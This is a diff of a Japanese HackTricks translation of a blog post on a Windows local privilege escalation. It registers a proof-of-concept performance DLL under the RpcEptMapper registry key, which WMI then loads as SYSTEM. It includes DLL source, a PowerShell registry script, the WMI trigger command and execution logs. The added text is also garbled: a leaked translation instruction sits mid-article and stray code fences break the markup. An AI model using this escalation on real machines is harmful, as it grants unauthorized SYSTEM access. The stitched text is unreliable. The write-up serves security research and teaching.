@@ -1,32 +1,32 @@
+```markdown
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>
 
-- **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+HackTricksをサポートする他の方法:
 
-- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-
-- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-
-- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
-
-- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
+* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
+* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
+* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。
 
 </details>
 
 
-**情報はここからコピー** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
+**情報はこちらからコピーされました** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
 
-スクリプトの出力によると、現在のユーザーは2つのレジストリキーに対していくつかの書き込み権限を持っています。
+スクリプトの出力によると、現在のユーザーは二つのレジストリキーに対する書き込み権限を持っています:
 
 * `HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`
 * `HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`
 
-`regedit` GUIを使用して、`RpcEptMapper`サービスの権限を手動で確認しましょう。私が本当に気に入っているのは、_Advanced Security Settings_ウィンドウの_Effective Permissions_タブです。任意のユーザーまたはグループ名を選択すると、個別にすべてのACEを調査する必要なく、この主体に付与された有効な権限がすぐに表示されます。次のスクリーンショットは、低特権の`lab-user`アカウントの結果を示しています。
+`regedit` GUIを使用して`RpcEptMapper`サービスの権限を手動で確認しましょう。_詳細セキュリティ設定_ウィンドウについて私が本当に気に入っているのは、_有効な権限_タブです。任意のユーザーまたはグループ名を選択し、すべてのACEを個別に検査することなく、このプリンシパルに付与されている有効な権限をすぐに確認できます。以下のスクリーンショットは、権限の低い`lab-user`アカウントの結果を示しています。
 
 ![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/02\_regsitry-rpceptmapper-permissions.png)
 
-ほとんどの権限は標準です（例：`Query Value`）が、特に1つが目立ちます：`Create Subkey`。この権限に対応する一般的な名前は`AppendData/AddSubdirectory`であり、スクリプトで報告された内容とまったく同じです。
+ほとんどの権限は標準的です（例：`Query Value`）が、特に目立つものが一つあります：`Create Subkey`。この権限に対応する一般的な名前は`AppendData/AddSubdirectory`で、これはスクリプトによって報告されたものとまさに一致しています：
+```
 ```
 Name              : RpcEptMapper
 ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
@@ -48,61 +48,67 @@ Status            : Running
 UserCanStart      : True
 UserCanRestart    : False
 ```
-これは正確に何を意味していますか？これは、たとえば`ImagePath`の値を変更することはできないということを意味しています。そのためには、`WriteData/AddFile`の許可が必要です。代わりに、新しいサブキーの作成のみが可能です。
+以下は、ハッキング技術に関するハッキングの本の内容です。関連する英語のテキストを日本語に翻訳し、まったく同じマークダウンとHTML構文を保持して翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'という単語、ペネトレーションテスト、およびマークダウンタグなどの翻訳は行わないでください。また、翻訳とマークダウン構文以外の余分なものを追加しないでください。
 
-![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/03_registry-imagepath-access-denied.png)
+---
 
-これは本当に誤検知だったのでしょうか？確かにそうではありません。楽しみましょう！
+これは具体的に何を意味するのでしょうか？例えば、`ImagePath` の値を変更することはできません。それを行うには、`WriteData/AddFile` 権限が必要です。代わりに、新しいサブキーを作成することしかできません。
+
+![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/03\_registry-imagepath-access-denied.png)
+
+これは、実際に偽陽性だったということでしょうか？決してそうではありません。楽しみはこれからです！
 
 ## RTFM <a href="#rtfm" id="rtfm"></a>
 
-この時点で、`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`の下に任意のサブキーを作成できることはわかっていますが、既存のサブキーと値を変更することはできません。これらの既存のサブキーは、`Parameters`と`Security`であり、Windowsサービスには一般的なものです。
+この時点で、`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper` の下に任意のサブキーを作成できることがわかっていますが、既存のサブキーと値を変更することはできません。既に存在するサブキーは `Parameters` と `Security` で、これらはWindowsサービスにとってかなり一般的です。
 
-![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/04_registry-rpceptmapper-config.png)
+![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/04\_registry-rpceptmapper-config.png)
 
-したがって、最初に思い浮かんだ質問は次のとおりです:「`Parameters`や`Security`のような、効果的にサービスの構成を変更し、動作を変更するために利用できる他の事前定義されたサブキーはあるのでしょうか？」
+したがって、最初に頭に浮かんだ質問は、_`Parameters` や `Security` のような他の事前定義されたサブキーがあり、それを利用してサービスの設定を効果的に変更し、何らかの方法でその動作を変更できるかどうか_ でした。
 
-この質問に答えるために、最初の計画はすべての既存のキーを列挙し、パターンを特定することでした。アイデアは、サービスの構成にとって「意味のある」サブキーを見ることでした。これをPowerShellで実装し、結果をソートすることができるかどうか考え始めました。しかし、それを行う前に、このレジストリ構造が既に文書化されているかどうか疑問に思いました。そのため、`windows service configuration registry site:microsoft.com`のようなキーワードでGoogle検索を行い、最初の[結果](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree)が表示されました。
+この質問に答えるために、私の最初の計画は、すべての既存のキーを列挙し、パターンを特定しようとすることでした。サービスの設定に_意味のある_サブキーがどれかを見ることがアイデアでした。PowerShellでそれをどのように実装し、結果をソートするかについて考え始めました。しかし、その前に、このレジストリ構造がすでに文書化されているかどうか疑問に思いました。そこで、`windows service configuration registry site:microsoft.com` のようなものをグーグルで検索し、こちらが最初に出てきた[結果](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree)です。
 
-![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/05_google-search-registry-services.png)
+![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/05\_google-search-registry-services.png)
 
-有望ですね。一見すると、ドキュメントは完全ではないように思えました。タイトルを考慮すると、サービスの構成を定義するすべてのサブキーと値を詳細に説明したツリー構造が表示されることを期待していましたが、明らかにそこにはありませんでした。
+有望に見えますね？一見すると、文書は網羅的で完全ではないように見えました。タイトルを考えると、サービスの設定を定義するすべてのサブキーと値を詳細に説明する何らかのツリー構造を見ることを期待していましたが、明らかにそこにはありませんでした。
 
-![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/06_doc-registry-services.png)
+![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/06\_doc-registry-services.png)
 
-それでも、各段落をざっと見てみました。そして、「_**Performance**_」と「_**DLL**_」というキーワードにすぐに気付きました。「**Perfomance**」の小見出しの下では、次のように説明されています。
+それでも、各段落を素早く見てみました。そして、すぐに "_**Performance**_" と "_**DLL**_" というキーワードを見つけました。"**Perfomance**" のサブタイトルの下では、次のように読むことができます：
 
-> **Performance**: _オプションのパフォーマンスモニタリングの情報を指定するキーです。このキーの値は、**ドライバのパフォーマンスDLLの名前**と、そのDLLの**特定のエクスポートされた関数の名前**を指定します。ドライバのINFファイルのAddRegエントリを使用して、このサブキーに値エントリを追加できます。_
+> **Performance**: _オプションのパフォーマンス監視のための情報を指定するキーです。このキーの下の値は、**ドライバーのパフォーマンスDLLの名前**と、そのDLL内でエクスポートされるべき**特定の関数の名前**を指定します。ドライバーのINFファイルのAddRegエントリを使用して、このサブキーに値エントリを追加することができます。_
 
-この短い段落によると、`Performance`サブキーを使用して、ドライバサービスにDLLを登録してパフォーマンスを監視することが理論的に可能です。**これは非常に興味深いです！** このキーは`RpcEptMapper`サービスのデフォルトでは存在しないので、まさに必要なもののようです。ただし、このサービスは明らかにドライバサービスではありません。とにかく、試してみる価値はありますが、「_パフォーマンスモニタリング_」機能についてのさらなる情報が必要です。
+この短い段落によると、理論的には、`Performance` サブキーを使用して、ドライバーサービスにDLLを登録し、そのパフォーマンスを監視することができます。**OK、これは本当に興味深いです！** このキーは `RpcEptMapper` サービスにはデフォルトでは存在しないので、まさに私たちが必要としているもののようです。ただし、このサービスは明らかにドライバーサービスではありません。とにかく、試してみる価値はありますが、まずはこの "_パフォーマンス監視_" 機能についてもっと情報が必要です。
 
-![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/07_sc-qc-rpceptmapper.png)
+![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/07\_sc-qc-rpceptmapper.png)
 
-> **注意:** Windowsでは、各サービスには特定の`Type`があります。サービスのタイプは次の値のいずれかであることがあります: `SERVICE_KERNEL_DRIVER (1)`, `SERVICE_FILE_SYSTEM_DRIVER (2)`, `SERVICE_ADAPTER (4)`, `SERVICE_RECOGNIZER_DRIVER (8)`, `SERVICE_WIN32_OWN_PROCESS (16)`, `SERVICE_WIN32_SHARE_PROCESS (32)`または`SERVICE_INTERACTIVE_PROCESS (256)`。
+> **注:** Windowsでは、各サービスには特定の `Type` があります。サービスタイプには次の値があります：`SERVICE_KERNEL_DRIVER (1)`, `SERVICE_FILE_SYSTEM_DRIVER (2)`, `SERVICE_ADAPTER (4)`, `SERVICE_RECOGNIZER_DRIVER (8)`, `SERVICE_WIN32_OWN_PROCESS (16)`, `SERVICE_WIN32_SHARE_PROCESS (32)` または `SERVICE_INTERACTIVE_PROCESS (256)`。
 
-Google検索をしていくつかの情報を見つけました。ドキュメントには、[Creating the Application’s Performance Key](https://docs.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)というリソースがあります。
+いくつかのグーグル検索の後、ドキュメントでこのリソースを見つけました：[Creating the Application’s Performance Key](https://docs.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)。
 
-![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/08_performance-subkey-documentation.png)
+![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/08\_performance-subkey-documentation.png)
 
-まず、作成する必要のあるすべてのキーと値がリストアップされた素敵なツリー構造があります。その後、説明では次のようなキー情報が与えられています。
+まず、作成する必要があるすべてのキーと値をリストする素敵なツリー構造があります。次に、説明には以下の重要な情報があります：
 
-* `Library`の値には、**DLLの名前またはDLLへの完全なパス**を指定できます。
-* `Open`、`Collect`、`Close`の値を使用して、DLLがエクスポートする関数の名前を指定できます。
-* これらの値のデータ型は`REG_SZ`です（`Library`の値の場合は`REG_EXPAND_SZ`です）。
+* `Library` 値には **DLL名またはDLLへの完全なパス** を含めることができます。
+* `Open`, `Collect`, `Close` 値を使用して、DLLによってエクスポートされるべき **関数の名前** を指定できます。
+* これらの値のデータタイプは `REG_SZ`（または `Library` 値の場合は `REG_EXPAND_SZ`）です。
 
-このリソースに含まれているリンクをたどると、これらの関数のプロトタイプといくつかのコードサンプルが見つかります: [Implementing OpenPerformanceData](https://docs.microsoft.com/en-us/windows/win32/perfctrs/implementing-openperformancedata)。
+このリソースに含まれるリンクをたどると、これらの関数のプロトタイプといくつかのコードサンプルまで見つけることができます：[Implementing OpenPerformanceData](https://docs.microsoft.com/en-us/windows/win32/perfctrs/implementing-openperformancedata)。
 ```
 DWORD APIENTRY OpenPerfData(LPWSTR pContext);
 DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
 DWORD APIENTRY ClosePerfData();
 ```
-## Proof-of-Conceptの作成 <a href="#writing-a-proof-of-concept" id="writing-a-proof-of-concept"></a>
+理論はこれくらいにして、コードの記述を始めましょう！
 
-ドキュメント全体から収集したビットとピースのおかげで、シンプルなProof-of-Concept DLLを作成することは非常に簡単です。しかし、それでも計画が必要です！
+## プルーフ・オブ・コンセプトの作成 <a href="#writing-a-proof-of-concept" id="writing-a-proof-of-concept"></a>
 
-DLLハイジャックの脆弱性を悪用する必要がある場合、通常はシンプルでカスタムなログヘルパー関数から始めます。この関数の目的は、呼び出されるたびにいくつかの重要な情報をファイルに書き込むことです。通常、現在のプロセスと親プロセスのPID、プロセスを実行しているユーザーの名前、対応するコマンドラインをログに記録します。また、このログイベントをトリガーした関数の名前も記録します。これにより、どのコードの部分が実行されたかがわかります。
+ドキュメントを通じて集めた情報を元に、シンプルなプルーフ・オブ・コンセプトDLLを書くのはかなり簡単なはずです。しかし、計画が必要です！
 
-他の記事では、開発部分を省略していましたが、それはほぼ明らかだと思っていました。しかし、私のブログ投稿は初心者にも分かりやすいものにしたいと思っているので、矛盾があります。ここではこの状況を解消するために、プロセスの詳細な説明を行います。では、Visual Studioを起動して新しい「_C++ Console App_」プロジェクトを作成しましょう。注意点として、「_Dynamic-Link Library (DLL)_」プロジェクトを作成することもできますが、実際にはコンソールアプリから始める方が簡単だと思います。
+DLLハイジャックの脆弱性を悪用する必要がある場合、通常、シンプルでカスタムのログヘルパー関数から始めます。この関数の目的は、呼び出されるたびに重要な情報をファイルに書き込むことです。通常、現在のプロセスと親プロセスのPID、プロセスを実行しているユーザーの名前と対応するコマンドラインをログに記録します。また、このログイベントをトリガーした関数の名前もログに記録します。この方法で、コードのどの部分が実行されたかを知ることができます。
+
+他の記事では、開発部分は比較的明白だと仮定して常にスキップしていました。しかし、ブログ投稿を初心者にも優しいものにしたいとも思っているので、矛盾があります。ここでは、プロセスを詳細に説明することでこの状況を改善します。では、Visual Studioを起動して新しい「_C++ コンソールアプリ_」プロジェクトを作成しましょう。なお、「_ダイナミックリンクライブラリ(DLL)_」プロジェクトを作成することもできましたが、実際にはコンソールアプリから始める方が簡単だと感じています。
 
 以下は、Visual Studioによって生成された初期コードです：
 ```c
@@ -113,7 +119,7 @@ int main()
 std::cout << "Hello World!\n";
 }
 ```
-もちろん、それは私たちが望むものではありません。私たちはDLLを作成したいので、`main`関数を`DllMain`に置き換える必要があります。この関数のスケルトンコードはドキュメントで見つけることができます：[DLLの初期化](https://docs.microsoft.com/en-us/cpp/build/run-time-library-behavior#initialize-a-dll)。
+もちろん、それは私たちが望むものではありません。EXEではなくDLLを作成したいので、`main` 関数を `DllMain` に置き換える必要があります。この関数のスケルトンコードはドキュメントで見つけることができます：[DLLの初期化](https://docs.microsoft.com/en-us/cpp/build/run-time-library-behavior#initialize-a-dll)。
 ```c
 #include <Windows.h>
 
@@ -134,9 +140,11 @@ break;
 return TRUE;
 }
 ```
-同時に、プロジェクトの設定を変更して、コンパイルされた出力ファイルがEXEではなくDLLであることを指定する必要があります。これを行うには、プロジェクトのプロパティを開き、「**一般**」セクションで「**動的ライブラリ (.dll)**」を「**構成の種類**」として選択します。タイトルバーのすぐ下にある「**すべての構成**」と「**すべてのプラットフォーム**」も選択して、この設定をグローバルに適用できるようにします。
+```markdown
+同時に、出力コンパイルファイルがEXEではなくDLLであるべきことを指定するために、プロジェクトの設定を変更する必要があります。これを行うには、プロジェクトのプロパティを開き、「**General**」セクションで、「**Configuration Type**」として「**Dynamic Library (.dll)**」を選択します。タイトルバーのすぐ下で、「**All Configurations**」と「**All Platforms**」も選択できるので、この設定をグローバルに適用できます。
 
-次に、カスタムのログヘルパー関数を追加します。
+次に、私のカスタムログヘルパー関数を追加します。
+```
 ```c
 #include <Lmcons.h> // UNLEN + GetUserName
 #include <tlhelp32.h> // CreateToolhelp32Snapshot()
@@ -199,7 +207,7 @@ free(pwszBuffer);
 }
 }
 ```
-次に、私たちはDLLにドキュメントで見た3つの関数を追加します。ドキュメントには、成功した場合に`ERROR_SUCCESS`を返すべきだとも記載されています。
+その後、ドキュメントで見た3つの関数でDLLを満たすことができます。ドキュメントには、成功した場合は `ERROR_SUCCESS` を返すべきだとも記載されています。
 ```c
 DWORD APIENTRY OpenPerfData(LPWSTR pContext)
 {
@@ -219,7 +227,7 @@ Log(L"ClosePerfData");
 return ERROR_SUCCESS;
 }
 ```
-Ok、プロジェクトは正しく設定されました。`DllMain`が実装され、ログヘルパー関数と必要な3つの関数があります。ただし、最後に1つだけ不足しています。このコードをコンパイルすると、`OpenPerfData`、`CollectPerfData`、`ClosePerfData`は内部関数としてのみ利用可能になるため、**エクスポート**する必要があります。これはいくつかの方法で実現できます。たとえば、[DEF](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-def-files)ファイルを作成し、プロジェクトを適切に設定することができます。ただし、私は特にこのような小さなプロジェクトでは、`__declspec(dllexport)`キーワード（[doc](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-declspec-dllexport)）を使用することを好みます。この方法では、ソースコードの先頭で3つの関数を宣言するだけで済みます。
+プロジェクトが適切に設定され、`DllMain`が実装され、ログヘルパー関数と必要な3つの関数が用意されました。しかし、まだ足りないものがあります。このコードをコンパイルすると、`OpenPerfData`、`CollectPerfData`、`ClosePerfData`は内部関数としてのみ利用可能になるため、これらを**エクスポート**する必要があります。これはいくつかの方法で達成できます。例えば、[DEF](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-def-files)ファイルを作成し、プロジェクトを適切に設定することができます。しかし、私は特にこのような小規模なプロジェクトには、`__declspec(dllexport)`キーワード([doc](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-declspec-dllexport))を使用することを好みます。この方法では、ソースコードの始めに3つの関数を宣言するだけで済みます。
 ```c
 extern "C" __declspec(dllexport) DWORD APIENTRY OpenPerfData(LPWSTR pContext);
 extern "C" __declspec(dllexport) DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
@@ -227,36 +235,34 @@ extern "C" __declspec(dllexport) DWORD APIENTRY ClosePerfData();
 ```
 完全なコードを見たい場合は、[こちら](https://gist.github.com/itm4n/253c5937f9b3408b390d51ac068a4d12)にアップロードしました。
 
-最後に、_**Release/x64**_ を選択し、「_**ソリューションをビルド**_」します。これにより、次のDLLファイルが生成されます：`.\DllRpcEndpointMapperPoc\x64\Release\DllRpcEndpointMapperPoc.dll`。
+最後に、_**Release/x64**_ を選択し、“_**Build the solution**_”を行います。これにより、DLLファイルが生成されます：`.\DllRpcEndpointMapperPoc\x64\Release\DllRpcEndpointMapperPoc.dll`。
 
 ## PoCのテスト <a href="#testing-the-poc" id="testing-the-poc"></a>
 
-さらに進む前に、ペイロードが正常に動作していることを常に確認するために、別々にテストすることをお勧めします。ここで少し時間をかけることで、仮想的なデバッグフェーズ中に迷路に迷い込むことを防ぐため、後で多くの時間を節約できます。そのために、単純に`rundll32.exe`を使用し、DLLの名前とエクスポートされた関数の名前をパラメータとして渡すことができます。
+さらに進む前に、別途ペイロードが正しく動作することを常に確認します。ここで少し時間をかけることで、仮想のデバッグフェーズ中に迷路に陥ることを防ぎ、後で多くの時間を節約できます。これを行うには、単純に`rundll32.exe`を使用し、パラメータとしてDLLの名前とエクスポートされた関数の名前を渡します。
 ```
 C:\Users\lab-user\Downloads\>rundll32 DllRpcEndpointMapperPoc.dll,OpenPerfData
 ```
-![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/09\_test-poc-rundll32.gif)
-
-素晴らしい、ログファイルが作成されました。開いてみると、2つのエントリが表示されます。最初のエントリは、`rundll32.exe`によってDLLがロードされたときに書き込まれました。2番目のエントリは、`OpenPerfData`が呼び出されたときに書き込まれました。うまくいっていますね！😊
+素晴らしい、ログファイルが作成されました。そして、それを開くと、2つのエントリが見えます。最初のエントリはDLLが`rundll32.exe`によってロードされたときに書かれました。2番目のエントリは`OpenPerfData`が呼び出されたときに書かれました。良さそうです！ ![:slightly\_smiling\_face:](https://github.githubassets.com/images/icons/emoji/unicode/1f642.png)
 ```
 [21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32  DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='DllMain'
 [21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32  DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='OpenPerfData'
 ```
-よし、では実際の脆弱性に焦点を当てて、必要なレジストリキーと値の作成を始めましょう。これは、`reg.exe` / `regedit.exe`を使用して手動で行うか、スクリプトを使用してプログラム的に行うことができます。初期の調査中に手動で手順を実行したので、同じことをより簡潔に行うPowerShellスクリプトを示します。また、PowerShellでレジストリキーと値を作成するのは、`New-Item`と`New-ItemProperty`を呼び出すだけですね。![:thinking:](https://github.githubassets.com/images/icons/emoji/unicode/1f914.png)
+では、実際の脆弱性に焦点を当て、必要なレジストリキーと値を作成し始めましょう。これは、`reg.exe` / `regedit.exe`を使用して手動で行うか、スクリプトを使用してプログラムで行うことができます。私は初期の研究中に手動のステップをすでに説明しましたので、PowerShellスクリプトを使用して同じことをよりクリーンに行う方法を示します。また、PowerShellでレジストリキーと値を作成するのは、`New-Item`と`New-ItemProperty`を呼び出すのと同じくらい簡単ですよね？ ![:thinking:](https://github.githubassets.com/images/icons/emoji/unicode/1f914.png)
 
 ![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/10\_powershell-new-item-access-denied.png)
 
-`要求されたレジストリ アクセスが許可されていません`... うーん、そうですか... 結局、そんなに簡単ではないようですね。![:stuck\_out\_tongue:](https://github.githubassets.com/images/icons/emoji/unicode/1f61b.png)
+`Requested registry access is not allowed`… うーん、やはりそれほど簡単ではないようですね。 ![:stuck\_out\_tongue:](https://github.githubassets.com/images/icons/emoji/unicode/1f61b.png)
 
-この問題についてはあまり調査していませんが、おそらく`New-Item`を呼び出すとき、`powershell.exe`は実際には親のレジストリキーをいくつかのフラグとともに開こうとしていて、それが私たちが持っていない権限に対応しているのかもしれません。
+この問題についてはあまり調査していませんが、`New-Item`を呼び出すと、`powershell.exe`が実際には親レジストリキーを開こうとして、私たちが持っていない権限に対応するフラグを使用しているのではないかと推測します。
 
-とにかく、組み込みのコマンドレットがうまくいかない場合は、常に1つ下のレベルに移動して、直接DotNet関数を呼び出すことができます。実際には、次のコードでレジストリキーもPowerShellで作成できます。
+とにかく、組み込みのコマンドレットが機能しない場合は、一段階下がって直接DotNet関数を呼び出すことができます。実際、以下のPowerShellコードでもレジストリキーを作成できます。
 ```
 [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey("SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance")
 ```
-![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/11\_powershell-dotnet-createsubkey.png)
-
-さあ、始めましょう！最終的に、適切なキーと値を作成し、ユーザーの入力を待ち、最後にすべてをクリーンアップして終了するために、以下のスクリプトをまとめました。
+```markdown
+さあ、始めましょう！最終的に、適切なキーと値を作成し、ユーザーの入力を待って、最後にすべてをクリーニングして終了するための以下のスクリプトをまとめました。
+```
 ```
 $ServiceKey = "SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance"
 
@@ -280,17 +286,17 @@ Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Force
 Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Force
 [Microsoft.Win32.Registry]::LocalMachine.DeleteSubKey($ServiceKey)
 ```
-最後のステップは、**RPCエンドポイントマッパーサービスをどのようにして私たちのパフォーマンスDLLを読み込ませるか**です。残念ながら、私は試したさまざまなことを追跡していません。このブログ記事の文脈では、研究がどれだけ手間と時間がかかることがあるかを強調することは非常に興味深いでしょう。とにかく、途中で見つけたことの一つは、WMI（Windows Management Instrumentation）を使用して_パフォーマンスカウンター_をクエリできることです。これはあまり驚くべきことではありません。詳細はこちら：[_WMIパフォーマンスカウンタータイプ_](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-performance-counter-types)。
+最後のステップです。**RPCエンドポイントマッパーサービスに私たちのパフォーマンスDLLを読み込ませるにはどうすればいいでしょうか？** 残念ながら、私が試したさまざまな方法をすべて追跡しているわけではありません。このブログ投稿の文脈で、研究が時にはいかに面倒で時間がかかるかを強調するのは非常に興味深いことでした。とにかく、途中で見つけたことの一つは、WMI（_Windows Management Instrumentation_）を使用して_パフォーマンスカウンター_をクエリできるということです。結局のところ、それほど驚くことではありません。詳細はこちら：[_WMIパフォーマンスカウンタータイプ_](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-performance-counter-types)。
 
-> _カウンタータイプは、_ [_Win32\_PerfRawData_](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-perfrawdata) _クラスのプロパティのCounterType修飾子として表示され、_ [_Win32\_PerfFormattedData_](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-perfformatteddata) _クラスのプロパティのCookingType修飾子として表示されます。_
+> _カウンタータイプは、_ [_Win32\_PerfRawData_](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-perfrawdata) _クラスのプロパティにCounterType修飾子として、また_ [_Win32\_PerfFormattedData_](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-perfformatteddata) _クラスのプロパティにCookingType修飾子として現れます。_
 
-したがって、最初に次のコマンドを使用して、PowerShellで_パフォーマンスデータ_に関連するWMIクラスを列挙しました。
+そこで、まずPowerShellを使用して、関連するWMIクラスを以下のコマンドで列挙しました。
 ```
 Get-WmiObject -List | Where-Object { $_.Name -Like "Win32_Perf*" }
 ```
-![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/12\_powershell-get-wmiobject.gif)
+![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/12_powershell-get-wmiobject.gif)
 
-そして、私はログファイルがほぼすぐに作成されたことに気付きました！以下はファイルの内容です。
+そして、私のログファイルがほぼすぐに作成されたのを見ました！ 以下がファイルの内容です。
 ```
 [21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='DllMain'
 [21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='OpenPerfData'
@@ -306,11 +312,13 @@ Get-WmiObject -List | Where-Object { $_.Name -Like "Win32_Perf*" }
 [21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
 [21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
 ```
-予想では、最大でも`RpcEptMapper`サービスのコンテキストで`NETWORK SERVICE`として任意のコードを実行できると思っていましたが、予想以上の結果が得られました。実際には、`WMI`サービス自体のコンテキストで任意のコードを実行できました。このサービスは`LOCAL SYSTEM`として実行されています。素晴らしい結果ですね！ ![:sunglasses:](https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png)
+```markdown
+私は最初、`RpcEptMapper` サービスのコンテキストで `NETWORK SERVICE` として任意のコード実行ができると思っていましたが、予想以上の結果を得ることができました。実際には、`LOCAL SYSTEM` として実行される `WMI` サービス自体のコンテキストで任意のコード実行ができたのです。これはすごいことではないでしょうか？ ![:sunglasses:](https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png)
 
-> **注意:** もし`NETWORK SERVICE`として任意のコードを実行できた場合、数ヶ月前にJames Forshawがこのブログ記事でデモンストレーションしたトリックによって、`LOCAL SYSTEM`アカウントまであと一歩のところでした: [Sharing a Logon Session a Little Too Much](https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html)。
